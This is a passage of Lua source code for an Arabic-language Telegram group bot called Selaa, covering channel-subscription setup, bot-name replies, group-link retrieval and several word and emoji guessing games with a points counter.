send(msg.chat_id_, msg.id_,'↯☆البوت ادمن في القناة \n↯☆تم تفعيل الاشتراك الاجباري \n↯☆ايدي القناة ⇇ '..data.id_..'\n↯☆معرف القناة ⇇ [@'..data.type_.channel_.username_..']')
Selaa:set(Selaa..'Selaa2',data.id_)
Selaa:set(Selaa..'Selaa3','@'..data.type_.channel_.username_)
else
send(msg.chat_id_, msg.id_,'↯☆عذرا البوت ليس ادمن في القناة')
end
return false  
end
end,nil)
end
--     Source Selaa     --
if Selaa:get(Selaa.."Selaa:DevText" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then
if text and text:match("^الغاء$") then 
Selaa:del(Selaa.."Selaa:DevText" .. msg.chat_id_ .. ":" .. msg.sender_user_id_)
Selaa(msg.chat_id_, msg.id_, 1, '↯☆تم الغاء الامر', 1, 'md')
return false 
end 
Selaa:del(Selaa.."Selaa:DevText" .. msg.chat_id_ .. ":" .. msg.sender_user_id_)
local DevText = msg.content_.text_:match("(.*)")
Selaa:set(Selaa.."DevText", DevText)
Selaa(msg.chat_id_, msg.id_, 1, "↯☆تم حفظ كليشة المطور", 1, "md")
end
if Selaa:get(Selaa..'Selaa:NameBot'..msg.sender_user_id_) == 'msg' then
if text and text:match("^الغاء$") then 
Selaa:del(Selaa..'Selaa:NameBot'..msg.sender_user_id_)
Selaa(msg.chat_id_, msg.id_, 1, '↯☆تم الغاء الامر', 1, 'md')
return false 
end 
Selaa(msg.chat_id_, msg.id_, 1, '↯☆تم حفظ اسم البوت ', 1, 'html')
Selaa:del(Selaa..'Selaa:NameBot'..msg.sender_user_id_)
Selaa:set(Selaa..'Selaa:NameBot', text)
return false 
end
--     Source Selaa     --
if text == "الرابط" then
if not Selaa:get(Selaa.."Selaa:Lock:GpLinks"..msg.chat_id_) then 
if Selaa:get(Selaa.."Selaa:Groups:Links"..msg.chat_id_) then
Selaa(msg.chat_id_, msg.id_, 1, "↯☆𝒈𝒓𝒐𝒖𝒑 𝒍𝒊𝒏𝒌 ↬ ⤈ \n┉ ≈ ┉ ≈ ᵴᵉℒᗩ≈ ┉ ≈ ┉\n"..Selaa:get(Selaa.."Selaa:Groups:Links"..msg.chat_id_), 1, "html")
else 
Selaa(msg.chat_id_, msg.id_, 1, '↯☆لايوجد رابط ارسل ⇇ ضع رابط او ارسل ⇇ انشاء رابط للانشاء', 1, 'md')
end
else
Selaa(msg.chat_id_, msg.id_, 1, '↯☆جلب رابط المجموعه معطل', 1, 'md')
end
end
--     Source Selaa     --
if ChatType == 'sp' or ChatType == 'gp'  then
if text == 'بوت' or text == 'بوتت' then 
NameBot = (Selaa:get(Selaa..'Selaa:NameBot') or 'سيلا')
local SelaaTEAM = {"لتكول بوت اسمي "..NameBot.." 😒🔪","اسمي القميل "..NameBot.." 😚♥️","عندي اسم تره 😒💔","صيحولي "..NameBot.." كافي بوت 😒🔪","انت البوت لك 😒💔"} 
Selaa2 = math.random(#SelaaTEAM) 
Selaa(msg.chat_id_, msg.id_, 1, SelaaTEAM[Selaa2] , 1, 'html') 
return false
end
if text == 'اسم البوت' or text == 'البوت شنو اسمه' or text == 'شسمه البوت' or text == 'البوت شسمه' then
NameBot = (Selaa:get(Selaa..'Selaa:NameBot') or 'سيلا') 
local SelaaTEAM = {"اسمي القميل "..NameBot.." 😚♥️","هلاا يروحيي وياكك "..NameBot.." 😻♥️"} 
Selaa2 = math.random(#SelaaTEAM) 
Selaa(msg.chat_id_, msg.id_, 1, SelaaTEAM[Selaa2] , 1, 'html') 
return false
end
if text and text == (Selaa:get(Selaa..'Selaa:NameBot') or 'سيلا') then 
NameBot = (Selaa:get(Selaa..'Selaa:NameBot') or 'سيلا')
local namebot = {'😸♥️ هلا كلبي وياك '..NameBot..' تفضل','ترةه مصختهاا احجيي شرايد 😕😒💔','اطلقق واحدد يصيح '..NameBot..' 😻♥️','خبصتت امنةة شتريدد عااد 🤧😒💔'} 
name = math.random(#namebot) 
Selaa(msg.chat_id_, msg.id_, 1, namebot[name] , 1, 'html') 
return false 
end
if text =='نقاطي' and ChCheck(msg) then 
if tonumber((Selaa:get(Selaa..'Selaa:GamesNumber'..msg.chat_id_..msg.sender_user_id_) or 0)) == 0 then
Selaa(msg.chat_id_, msg.id_, 1,'↯☆لم تربح اي نقطه\n↯☆ارسل ⇇ الالعاب للعب', 1, 'md')
else 
Selaa(msg.chat_id_, msg.id_, 1,'↯☆عدد النقاط التي ربحتها ⇇ '..(Selaa:get(Selaa..'Selaa:GamesNumber'..msg.chat_id_..msg.sender_user_id_)), 1, 'md')
end
end
if text ==  'حذف رسائلي' and ChCheck(msg) or text ==  'مسح رسائلي' and ChCheck(msg) then Selaa:del(Selaa..'Selaa:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_) Selaa(msg.chat_id_, msg.id_, 1, '↯☆تم حذف جميع رسائلك', 1, 'md') end
if text ==  'حذف نقاطي' and ChCheck(msg) or text ==  'مسح نقاطي' and ChCheck(msg) then Selaa:del(Selaa..'Selaa:GamesNumber'..msg.chat_id_..msg.sender_user_id_) Selaa(msg.chat_id_, msg.id_, 1, '↯☆تم حذف جميع نقاطك', 1, 'md') end
--     Source Selaa     --
if text == 'سمايلات' and ChCheck(msg) or text == 'السمايلات' and ChCheck(msg) then
if Selaa:get(Selaa..'Selaa:Lock:Games'..msg.chat_id_) then
Selaa2 = {'🍏','🍎','🍐','🍊','🍋','🍌','🍉','🍇','🍓','🍈','🍒','🍑','🍍','🥥','🥝','🍅','🍆','🥑','🥦','🥒','🌶','🌽','🥕','🥔','🍠','🥐','🍞','🥖','🥨','🧀','🥚','🍳','🥞','🥓','🥩','🍗','🍖','🌭','🍔','🍟','🍕','🥪','🥙','🍼','☕️','🍵','🥤','🍶','🍺','🍻','🏀','⚽️','🏈','⚾️','🎾','🏐','🏉','🎱','🏓','🏸','🥅','🎰','🎮','🎳','🎯','🏆','🎻','🎸','🎺','🥁','🎹','🎼','🎧','🎤','🎬','🎨','🎭','🎪','🛎','📤','🎗','🏵','🎖','🏆','🥌','🛷','🚕','🚗','🚙','🚌','🚎','🏎','🚓','🚑','🚚','🚛','🚜','♡↯','⚔️','🛡','🔮','🌡','💣','⏱','🛢','📓','📗','📂','📅','📪','📫','📬','📭','⏰','📺','🎚','☎️','📡'}
name = Selaa2[math.random(#Selaa2)]
Selaa:set(Selaa..'Selaa:GameNum'..msg.chat_id_,name)
Selaa:del(Selaa..'Selaa:Games:Ids'..msg.chat_id_)
name = string.gsub(name,'🍞','🍞')
name = string.gsub(name,'🥖','🥖')
name = string.gsub(name,'🥨','🥨')
name = string.gsub(name,'🧀','🧀')
name = string.gsub(name,'🥚','🥚')
name = string.gsub(name,'🍳','🍳')
name = string.gsub(name,'🥞','🥞')
name = string.gsub(name,'🥓','🥓')
name = string.gsub(name,'🥩','🥩')
name = string.gsub(name,'🍗','🍗')
name = string.gsub(name,'🍖','🍖')
name = string.gsub(name,'🌭','🌭')
name = string.gsub(name,'🍔','🍔')
name = string.gsub(name,'🍟','🍟')
name = string.gsub(name,'🍕','🍕')
name = string.gsub(name,'🥪','🥪')
name = string.gsub(name,'🥙','🥙')
name = string.gsub(name,'🍼','🍼')
name = string.gsub(name,'☕️','☕️')
name = string.gsub(name,'🍵','🍵')
name = string.gsub(name,'🥤','🥤')
name = string.gsub(name,'🍶','🍶')
name = string.gsub(name,'🍺','🍺')
name = string.gsub(name,'🍏','🍏')
name = string.gsub(name,'🍎','🍎')
name = string.gsub(name,'🍐','🍐')
name = string.gsub(name,'🍊','🍊')
name = string.gsub(name,'🍋','🍋')
name = string.gsub(name,'🍌','🍌')
name = string.gsub(name,'🍉','🍉')
name = string.gsub(name,'🍇','🍇')
name = string.gsub(name,'🍓','🍓')
name = string.gsub(name,'🍈','🍈')
name = string.gsub(name,'🍒','🍒')
name = string.gsub(name,'🍑','🍑')
name = string.gsub(name,'🍍','🍍')
name = string.gsub(name,'🥥','🥥')
name = string.gsub(name,'🥝','🥝')
name = string.gsub(name,'🍅','🍅')
name = string.gsub(name,'🍆','🍆')
name = string.gsub(name,'🥑','🥑')
name = string.gsub(name,'🥦','🥦')
name = string.gsub(name,'🥒','🥒')
name = string.gsub(name,'🌶','🌶')
name = string.gsub(name,'🌽','🌽')
name = string.gsub(name,'🥕','🥕')
name = string.gsub(name,'🥔','🥔')
name = string.gsub(name,'🍠','🍠')
name = string.gsub(name,'🥐','🥐')
name = string.gsub(name,'🍻','🍻')
name = string.gsub(name,'🏀','🏀')
name = string.gsub(name,'⚽️','⚽️')
name = string.gsub(name,'🏈','🏈')
name = string.gsub(name,'⚾️','⚾️')
name = string.gsub(name,'🎾','🎾')
name = string.gsub(name,'🏐','🏐')
name = string.gsub(name,'🏉','🏉')
name = string.gsub(name,'🎱','🎱')
name = string.gsub(name,'🏓','🏓')
name = string.gsub(name,'🏸','🏸')
name = string.gsub(name,'🥅','🥅')
name = string.gsub(name,'🎰','🎰')
name = string.gsub(name,'🎮','🎮')
name = string.gsub(name,'🎳','🎳')
name = string.gsub(name,'🎯','🎯')
name = string.gsub(name,'🏆','🏆')
name = string.gsub(name,'🎻','🎻')
name = string.gsub(name,'🎸','🎸')
name = string.gsub(name,'🎺','🎺')
name = string.gsub(name,'🥁','🥁')
name = string.gsub(name,'🎹','🎹')
name = string.gsub(name,'🎼','🎼')
name = string.gsub(name,'🎧','🎧')
name = string.gsub(name,'🎤','🎤')
name = string.gsub(name,'🎬','🎬')
name = string.gsub(name,'🎨','🎨')
name = string.gsub(name,'🎭','🎭')
name = string.gsub(name,'🎪','🎪')
name = string.gsub(name,'🛎','🛎')
name = string.gsub(name,'📤','📤')
name = string.gsub(name,'🎗','🎗')
name = string.gsub(name,'🏵','🏵')
name = string.gsub(name,'🎖','🎖')
name = string.gsub(name,'🏆','🏆')
name = string.gsub(name,'🥌','🥌')
name = string.gsub(name,'🛷','🛷')
name = string.gsub(name,'🚕','🚕')
name = string.gsub(name,'🚗','🚗')
name = string.gsub(name,'🚙','🚙')
name = string.gsub(name,'🚌','🚌')
name = string.gsub(name,'🚎','🚎')
name = string.gsub(name,'🏎','🏎')
name = string.gsub(name,'🚓','🚓')
name = string.gsub(name,'🚑','🚑')
name = string.gsub(name,'🚚','🚚')
name = string.gsub(name,'🚛','🚛')
name = string.gsub(name,'🚜','🚜')
name = string.gsub(name,'♡↯','♡↯')
name = string.gsub(name,'⚔️','⚔️')
name = string.gsub(name,'🛡','🛡')
name = string.gsub(name,'🔮','🔮')
name = string.gsub(name,'🌡','🌡')
name = string.gsub(name,'💣','💣')
name = string.gsub(name,'⏱','⏱')
name = string.gsub(name,'🛢','🛢')
name = string.gsub(name,'📒','📒')
name = string.gsub(name,'📗','📗')
name = string.gsub(name,'📅','📆')
name = string.gsub(name,'📪','📪')
name = string.gsub(name,'📫','📫')
name = string.gsub(name,'📬','📬')
name = string.gsub(name,'📭','📭')
name = string.gsub(name,'⏰','⏰')
name = string.gsub(name,'📺','📺')
name = string.gsub(name,'🎚','🎚')
name = string.gsub(name,'☎️','☎️')
SelaaTEAM = '↯☆اول واحد يدز هذا السمايل يربح ⇇ '..name
Selaa(msg.chat_id_, msg.id_, 1,SelaaTEAM, 1, 'md')
return false
end end
if text == Selaa:get(Selaa..'Selaa:GameNum'..msg.chat_id_) and not Selaa:get(Selaa..'Selaa:Games:Ids'..msg.chat_id_) then
if not Selaa:get(Selaa..'Selaa:Games:Ids'..msg.chat_id_) then 
SelaaTEAM = '↯☆مبروك لقد ربحت في اللعبه \n↯☆ارسل ⇇ سمايلات للعب مره اخرى'
Selaa(msg.chat_id_, msg.id_, 1,SelaaTEAM, 1, 'md')
Selaa:incrby(Selaa..'Selaa:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
end
Selaa:set(Selaa..'Selaa:Games:Ids'..msg.chat_id_,true)
end
if text == 'ترتيب' and ChCheck(msg) or text == 'الترتيب' and ChCheck(msg) then
if Selaa:get(Selaa..'Selaa:Lock:Games'..msg.chat_id_) then
Selaa2 = {'سحور','سياره','استقبال','قنفه','ايفون','بزونه','مطبخ','كرستيانو','دجاجه','مدرسه','الوان','غرفه','ثلاجه','كهوه','سفينه','العراق','محطه','طياره','رادار','منزل','مستشفى','كهرباء','تفاحه','اخطبوط','سلمون','فرنسا','برتقاله','تفاح','مطرقه','بتيته','لهانه','شباك','باص','سمكه','ذباب','تلفاز','حاسوب','انترنيت','ساحه','جسر'};
name = Selaa2[math.random(#Selaa2)]
Selaa:set(Selaa..'Selaa:GameNum'..msg.chat_id_,name)
Selaa:del(Selaa..'Selaa:Games:Ids'..msg.chat_id_)
name = string.gsub(name,'سحور','س ر و ح')
name = string.gsub(name,'سياره','ه ر س ي ا')
name = string.gsub(name,'استقبال','ل ب ا ت ق س ا')
name = string.gsub(name,'قنفه','ه ق ن ف')
name = string.gsub(name,'ايفون','و ن ف ا')
name = string.gsub(name,'بزونه','ز و ه ن')
name = string.gsub(name,'مطبخ','خ ب ط م')
name = string.gsub(name,'كرستيانو','س ت ا ن و ك ر ي')
name = string.gsub(name,'دجاجه','ج ج ا د ه')
name = string.gsub(name,'مدرسه','ه م د ر س')
name = string.gsub(name,'الوان','ن ا و ا ل')
name = string.gsub(name,'غرفه','غ ه ر ف')
name = string.gsub(name,'ثلاجه','ج ه ت ل ا')
name = string.gsub(name,'كهوه','ه ك ه و')
name = string.gsub(name,'سفينه','ه ن ف ي س')
name = string.gsub(name,'العراق','ق ع ا ل ر ا')
name = string.gsub(name,'محطه','ه ط م ح')
name = string.gsub(name,'طياره','ر ا ط ي ه')
name = string.gsub(name,'رادار','ر ا ر ا د')
name = string.gsub(name,'منزل','ن ز م ل')
name = string.gsub(name,'مستشفى','ى ش س ف ت م')
name = string.gsub(name,'كهرباء','ر ب ك ه ا ء')
name = string.gsub(name,'تفاحه','ح ه ا ت ف')
name = string.gsub(name,'اخطبوط','ط ب و ا خ ط')
name = string.gsub(name,'سلمون','ن م و ل س')
name = string.gsub(name,'فرنسا','ن ف ر س ا')
name = string.gsub(name,'برتقاله','ر ت ق ب ا ه ل')
name = string.gsub(name,'تفاح','ح ف ا ت')
name = string.gsub(name,'مطرقه','ه ط م ر ق')
name = string.gsub(name,'بتيته','ب ت ت ي ه')
name = string.gsub(name,'لهانه','ه ن ل ه ل')
name = string.gsub(name,'شباك','ب ش ا ك')
name = string.gsub(name,'باص','ص ا ب')
name = string.gsub(name,'سمكه','ك س م ه')
name = string.gsub(name,'ذباب','ب ا ب ذ')
name = string.gsub(name,'تلفاز','ت ف ل ز ا')
name = string.gsub(name,'حاسوب','س ا ح و ب')
name = string.gsub(name,'انترنيت','ا ت ن ر ن ي ت')
name = string.gsub(name,'ساحه','ح ا ه س')
name = string.gsub(name,'جسر','ر ج س')
SelaaTEAM = '↯☆اول واحد يرتبها يربح ⇇ '..name
Selaa(msg.chat_id_, msg.id_, 1,SelaaTEAM, 1, 'md')
return false
end end
if text == Selaa:get(Selaa..'Selaa:GameNum'..msg.chat_id_) and not Selaa:get(Selaa..'Selaa:Games:Ids'..msg.chat_id_) then
if not Selaa:get(Selaa..'Selaa:Games:Ids'..msg.chat_id_) then 
SelaaTEAM = '↯☆مبروك لقد ربحت في اللعبه \n↯☆ارسل ⇇ ترتيب للعب مره اخرى'
Selaa(msg.chat_id_, msg.id_, 1,SelaaTEAM, 1, 'md')
Selaa:incrby(Selaa..'Selaa:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
end
Selaa:set(Selaa..'Selaa:Games:Ids'..msg.chat_id_,true)
end
if text == 'محيبس' and ChCheck(msg) or text == 'بات' and ChCheck(msg) or text == 'المحيبس' and ChCheck(msg) then
if Selaa:get(Selaa..'Selaa:Lock:Games'..msg.chat_id_) then
Num = math.random(1,6)
Selaa:set(Selaa.."GAMES"..msg.chat_id_,Num) 
TEST = [[
➀     ➁     ➂     ➃     ➄     ➅
↓     ↓     ↓     ↓     ↓     ↓
👊 ‹› 👊🏻 ‹› 👊🏼 ‹› 👊🏽 ‹› 👊🏾 ‹› 👊🏿

↯☆اختر رقم لاستخراج المحيبس
↯☆الفائز يحصل على (5) نقاط
]]
Selaa(msg.chat_id_, msg.id_, 1, TEST, 1, "md") 
Selaa:setex(Selaa.."SET:GAME"..msg.chat_id_, 100, true)  
return false  
end end
if text == 'حزوره' and ChCheck(msg) or text == 'الحزوره' and ChCheck(msg) then
if Selaa:get(Selaa..'Selaa:Lock:Games'..msg.chat_id_) then
Selaa2 = {'الجرس','عقرب الساعه','السمك','المطر','5','الكتاب','البسمار','7','الكعبه','بيت الشعر','لهانه','انا','امي','الابره','الساعه','22','غلط','كم الساعه','البيتنجان','البيض','المرايه','الضوء','الهواء','الضل','العمر','القلم','المشط','الحفره','البحر','الثلج','الاسفنج','الصوت','بلم'};
name = Selaa2[math.random(#Selaa2)]
Selaa:set(Selaa..'Selaa:GameNum'..msg.chat_id_,name)
Selaa:del(Selaa..'Selaa:Games:Ids'..msg.chat_id_)
name = string.gsub(name,'الجرس','شيئ اذا لمسته صرخ ما هوه ؟')
name = string.gsub(name,'عقرب الساعه','اخوان لا يستطيعان تمضيه اكثر من دقيقه معا فما هما ؟')
name = string.gsub(name,'السمك','ما هو الحيوان الذي لم يصعد الى سفينة نوح عليه السلام ؟')
name = string.gsub(name,'المطر','شيئ يسقط على رأسك من الاعلى ولا يجرحك فما هو ؟')
name = string.gsub(name,'5','ما العدد الذي اذا ضربته بنفسه واضفت عليه 5 يصبح ثلاثين ')
name = string.gsub(name,'الكتاب','ما الشيئ الذي له اوراق وليس له جذور ؟')
name = string.gsub(name,'البسمار','ما هو الشيئ الذي لا يمشي الا بالضرب ؟')
name = string.gsub(name,'7','عائله مؤلفه من 6 بنات واخ لكل منهن .فكم عدد افراد العائله ')
name = string.gsub(name,'الكعبه','ما هو الشيئ الموجود وسط مكة ؟')
name = string.gsub(name,'بيت الشعر','ما هو البيت الذي ليس فيه ابواب ولا نوافذ ؟ ')
name = string.gsub(name,'لهانه','وحده حلوه ومغروره تلبس مية تنوره .من هيه ؟ ')
name = string.gsub(name,'انا','ابن امك وابن ابيك وليس باختك ولا باخيك فمن يكون ؟')
name = string.gsub(name,'امي','اخت خالك وليست خالتك من تكون ؟ ')
name = string.gsub(name,'الابره','ما هو الشيئ الذي كلما خطا خطوه فقد شيئا من ذيله ؟ ')
name = string.gsub(name,'الساعه','ما هو الشيئ الذي يقول الصدق ولكنه اذا جاع كذب ؟')
name = string.gsub(name,'22','كم مره ينطبق عقربا الساعه على بعضهما في اليوم الواحد ')
name = string.gsub(name,'غلط','ما هي الكلمه الوحيده التي تلفض غلط دائما ؟ ')
name = string.gsub(name,'كم الساعه','ما هو السؤال الذي تختلف اجابته دائما ؟')
name = string.gsub(name,'البيتنجان','جسم اسود وقلب ابيض وراس اخظر فما هو ؟')
name = string.gsub(name,'البيض','ماهو الشيئ الذي اسمه على لونه ؟')
name = string.gsub(name,'المرايه','ارى كل شيئ من دون عيون من اكون ؟ ')
name = string.gsub(name,'الضوء','ما هو الشيئ الذي يخترق الزجاج ولا يكسره ؟')
name = string.gsub(name,'الهواء','ما هو الشيئ الذي يسير امامك ولا تراه ؟')
name = string.gsub(name,'الضل','ما هو الشيئ الذي يلاحقك اينما تذهب ؟ ')
name = string.gsub(name,'العمر','ما هو الشيء الذي كلما طال قصر ؟ ')
name = string.gsub(name,'القلم','ما هو الشيئ الذي يكتب ولا يقرأ ؟')
name = string.gsub(name,'المشط','له أسنان ولا يعض ما هو ؟ ')
name = string.gsub(name,'الحفره','ما هو الشيئ اذا أخذنا منه ازداد وكبر ؟')
name = string.gsub(name,'البحر','ما هو الشيئ الذي يرفع اثقال ولا يقدر يرفع مسمار ؟')
name = string.gsub(name,'الثلج','انا ابن الماء فان تركوني في الماء مت فمن انا ؟')
name = string.gsub(name,'الاسفنج','كلي ثقوب ومع ذالك احفض الماء فمن اكون ؟')
name = string.gsub(name,'الصوت','اسير بلا رجلين ولا ادخل الا بالاذنين فمن انا ؟')
name = string.gsub(name,'بلم','حامل ومحمول نصف ناشف ونصف مبلول فمن اكون ؟ ')
SelaaTEAM = '↯☆اول واحد يحلها يربح ⇇ '..name
Selaa(msg.chat_id_, msg.id_, 1,SelaaTEAM, 1, 'md')
return false
end end
if text == Selaa:get(Selaa..'Selaa:GameNum'..msg.chat_id_) and not Selaa:get(Selaa..'Selaa:Games:Ids'..msg.chat_id_) then
if not Selaa:get(Selaa..'Selaa:Games:Ids'..msg.chat_id_) then 
SelaaTEAM = '↯☆مبروك لقد ربحت في اللعبه \n↯☆ارسل ⇇ حزوره للعب مره اخرى'
Selaa(msg.chat_id_, msg.id_, 1,SelaaTEAM, 1, 'md')
Selaa:incrby(Selaa..'Selaa:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
end
Selaa:set(Selaa..'Selaa:Games:Ids'..msg.chat_id_,true)
end 
if text == 'المعاني' and ChCheck(msg) or text == 'معاني' and ChCheck(msg) then
if Selaa:get(Selaa..'Selaa:Lock:Games'..msg.chat_id_) then
Selaa2 = {'قرد','دجاجه','بطريق','ضفدع','بومه','نحله','ديك','جمل','بقره','دولفين','تمساح','قرش','نمر','اخطبوط','سمكه','خفاش','اسد','فأر','ذئب','فراشه','عقرب','زرافه','قنفذ','تفاحه','باذنجان'}
name = Selaa2[math.random(#Selaa2)]
Selaa:set(Selaa..'Selaa:GameNum2'..msg.chat_id_,name)
Selaa:del(Selaa..'Selaa:Games:Ids'..msg.chat_id_)
name = string.gsub(name,'قرد','🐒')
name = string.gsub(name,'دجاجه','🐔')
name = string.gsub(name,'بطريق','🐧')
name = string.gsub(name,'ضفدع','🐸')
name = string.gsub(name,'بومه','🦉')
name = string.gsub(name,'نحله','🐝')
name = string.gsub(name,'ديك','🐓')
name = string.gsub(name,'جمل','🐫')
name = string.gsub(name,'بقره','🐄')
name = string.gsub(name,'دولفين','🐬')
name = string.gsub(name,'تمساح','🐊')
name = string.gsub(name,'قرش','🦈')
name = string.gsub(name,'نمر','🐅')
name = string.gsub(name,'اخطبوط','🐙')
name = string.gsub(name,'سمكه','🐟')
name = string.gsub(name,'خفاش','🦇')
name = string.gsub(name,'اسد','🦁')
name = string.gsub(name,'فأر','🐭')
name = string.gsub(name,'ذئب','🐺')
name = string.gsub(name,'فراشه','🦋')
name = string.gsub(name,'عقرب','🦂')
name = string.gsub(name,'زرافه','🦒')
name = string.gsub(name,'قنفذ','🦔')
name = string.gsub(name,'تفاحه','🍎')
name = string.gsub(name,'باذنجان','🍆')
SelaaTEAM = '↯☆ما معنى هذا السمايل :؟ ⇇ '..name
Selaa(msg.chat_id_, msg.id_, 1,SelaaTEAM, 1, 'md')
return false
end end
if text == Selaa:get(Selaa..'Selaa:GameNum2'..msg.chat_id_) and not Selaa:get(Selaa..'Selaa:Games:Ids'..msg.chat_id_) then
if not Selaa:get(Selaa..'Selaa:Games:Ids'..msg.chat_id_) then 
SelaaTEAM = '↯☆مبروك لقد ربحت في اللعبه \n↯☆ارسل ⇇ المعاني للعب مره اخرى'
Selaa(msg.chat_id_, msg.id_, 1,SelaaTEAM, 1, 'md')
Selaa:incrby(Selaa..'Selaa:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
end
Selaa:set(Selaa..'Selaa:Games:Ids'..msg.chat_id_,true)
end 
if text == 'العكس' and ChCheck(msg) or text == 'عكس' and ChCheck(msg) then
if Selaa:get(Selaa..'Selaa:Lock:Games'..msg.chat_id_) then
Selaa2 = {'باي','فهمت','موزين','اسمعك','احبك','موحلو','نضيف','حاره','ناصي','جوه','سريع','ونسه','طويل','سمين','ضعيف','شريف','شجاع','رحت','عدل','نشيط','شبعان','موعطشان','خوش ولد','اني','هادئ'}
name = Selaa2[math.random(#Selaa2)]
Selaa:set(Selaa..'Selaa:GameNum3'..msg.chat_id_,name)
Selaa:del(Selaa..'Selaa:Games:Ids'..msg.chat_id_)
name = string.gsub(name,'باي','هلو')
name = string.gsub(name,'فهمت','مافهمت')
name = string.gsub(name,'موزين','زين')
name = string.gsub(name,'اسمعك','ماسمعك')
name = string.gsub(name,'احبك','ماحبك')
name = string.gsub(name,'محلو','حلو')
name = string.gsub(name,'نضيف','وصخ')
name = string.gsub(name,'حاره','بارده')
name = string.gsub(name,'ناصي','عالي')
name = string.gsub(name,'جوه','فوك')
name = string.gsub(name,'سريع','بطيء')
name = string.gsub(name,'ونسه','ضوجه')
name = string.gsub(name,'طويل','قزم')
name = string.gsub(name,'سمين','ضعيف')
name = string.gsub(name,'ضعيف','قوي')
name = string.gsub(name,'شريف','كواد')
name = string.gsub(name,'شجاع','جبان')
name = string.gsub(name,'رحت','اجيت')
name = string.gsub(name,'حي','ميت')
name = string.gsub(name,'نشيط','كسول')
name = string.gsub(name,'شبعان','جوعان')
name = string.gsub(name,'موعطشان','عطشان')
name = string.gsub(name,'خوش ولد','موخوش ولد')
name = string.gsub(name,'اني','مطي')
name = string.gsub(name,'هادئ','عصبي')
SelaaTEAM = '↯☆ما هو عكس كلمة ⇇ '..name
Selaa(msg.chat_id_, msg.id_, 1,SelaaTEAM, 1, 'md')
return false
end end
if text == Selaa:get(Selaa..'Selaa:GameNum3'..msg.chat_id_) and not Selaa:get(Selaa..'Selaa:Games:Ids'..msg.chat_id_) then
if not Selaa:get(Selaa..'Selaa:Games:Ids'..msg.chat_id_) then 
SelaaTEAM = '↯☆مبروك لقد ربحت في اللعبه \n↯☆ارسل ⇇ العكس للعب مره اخرى'
Selaa(msg.chat_id_, msg.id_, 1,SelaaTEAM, 1, 'md')
Selaa:incrby(Selaa..'Selaa:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
end
Selaa:set(Selaa..'Selaa:Games:Ids'..msg.chat_id_,true)
end 
if text == 'المختلف' and ChCheck(msg) or text == 'مختلف' and ChCheck(msg) then
if Selaa:get(Selaa..'Selaa:Lock:Games'..msg.chat_id_) then
Selaa2 = {'😸','☠','🐼','🐇','🌑','🌚','⭐️','📥','⛈','🌥','⛄️','👨‍🔬','👨‍💻','👨‍🔧','👩‍🍳','🧚‍♀','🧚‍♂️','🧝‍♂','🙍‍♂','🧖‍♂','👬','👨‍👨‍👧','🕓','🕤','⌛️','📅','👩‍⚖️','👨‍🎨'};
name = Selaa2[math.random(#Selaa2)]
Selaa:set(Selaa..'Selaa:GameNum4'..msg.chat_id_,name)
Selaa:del(Selaa..'Selaa:Games:Ids'..msg.chat_id_)
name = string.gsub(name,'😸','😹😹😹😸😹😹😹😹')
name = string.gsub(name,'☠️','💀💀💀☠️💀💀💀💀')
name = string.gsub(name,'🐼','👻👻👻👻👻👻👻🐼')
name = string.gsub(name,'🐇','🕊🕊🕊🕊🕊🐇🕊🕊')
name = string.gsub(name,'🌑','🌚🌚🌚🌚🌚🌑🌚🌚')
name = string.gsub(name,'🌚','🌑🌑🌑🌑🌑🌚🌑🌑')
name = string.gsub(name,'⭐️','🌟🌟🌟🌟🌟🌟⭐️🌟')
name = string.gsub(name,'📥','💫💫💫📥💫💫💫💫')
name = string.gsub(name,'⛈','🌨🌨🌨⛈🌨🌨🌨🌨')
name = string.gsub(name,'🌥','⛅️⛅️⛅️🌥⛅️⛅️⛅️⛅️')
name = string.gsub(name,'⛄️','☃️☃️☃️☃️⛄️☃️☃️☃️☃️')
name = string.gsub(name,'👨‍🔬','👩‍🔬👩‍🔬👩‍🔬👩‍🔬👩‍🔬👨‍🔬👩‍🔬👩‍🔬')
name = string.gsub(name,'👨‍💻','👩‍💻👩‍💻👨‍💻👩‍💻👩‍💻👩‍💻👩‍💻👩‍💻')
name = string.gsub(name,'👨‍🔧','👩‍🔧👩‍🔧👩‍🔧👩‍🔧👩‍🔧👩‍🔧👨‍🔧👩‍🔧')
name = string.gsub(name,'👩‍🍳','👨‍🍳👨‍🍳👩‍🍳👨‍🍳👨‍🍳👨‍🍳👨‍🍳👨‍🍳')
name = string.gsub(name,'🧚‍♀️','🧚‍♂️🧚‍♂️🧚‍♂️🧚‍♂️🧚‍♂️🧚‍♀️🧚‍♂️🧚‍♂️')
name = string.gsub(name,'🧚‍♂️','🧚‍♀️🧚‍♀️🧚‍♀️🧚‍♀️🧚‍♀️🧚‍♂️🧚‍♀️🧚‍♀️')
name = string.gsub(name,'🧝‍♂️','🧝‍♀️🧝‍♀️🧝‍♀️🧝‍♂️🧝‍♀️🧝‍♀️🧝‍♀️🧝‍♀️')
name = string.gsub(name,'🙍‍♂️','🙎‍♂️🙎‍♂️🙎‍♂️🙎‍♂️🙍‍♂️🙎‍♂️🙎‍♂️🙎‍♂️')
name = string.gsub(name,'🧖‍♂️','🧖‍♀️🧖‍♀️🧖‍♀️🧖‍♂️🧖‍♀️🧖‍♀️🧖‍♀️🧖‍♀️')
name = string.gsub(name,'👬','👭👭👭👭👬👭👭👭')
name = string.gsub(name,'👨‍👨‍👧','👨‍👨‍👦👨‍👨‍👦👨‍👨‍👦👨‍👨‍👦👨‍👨‍👦👨‍👨‍👧👨‍👨‍👦👨‍👨‍👦')
name = string.gsub(name,'🕓','🕒🕒🕒🕒🕓🕒🕒🕒')
name = string.gsub(name,'🕤','🕥🕥🕥🕥🕥🕤🕥🕥')
name = string.gsub(name,'⌛️','⏳⏳⏳⏳⏳⌛️⏳⏳')
name = string.gsub(name,'📅','📆📆📆📆📆📅📆📆')
name = string.gsub(name,'👩‍⚖️','👨‍⚖️👨‍⚖️👨‍⚖️👨‍⚖️👨‍⚖️👩‍⚖️👨‍⚖️👨‍⚖️')
name = string.gsub(name,'👨‍🎨','👩‍🎨👩‍🎨👨‍🎨👩‍🎨👩‍🎨👩‍🎨👩‍🎨👩‍🎨')
SelaaTEAM = '↯☆اول واحد يطلع المختلف يربح\n{'..name..'} '
